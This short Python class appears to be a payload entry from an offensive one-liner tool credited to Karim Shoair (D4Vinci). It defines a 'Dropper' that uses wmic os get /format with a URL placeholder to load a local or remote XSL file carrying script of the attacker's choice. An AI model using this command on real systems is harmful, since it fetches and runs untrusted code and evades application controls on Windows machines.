class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses wmic to invoke an XSL local or remote file, which may contain some scripting of our choice"
    function    = "Dropper"
    liner       = 'wmic os get /format:"URL"'
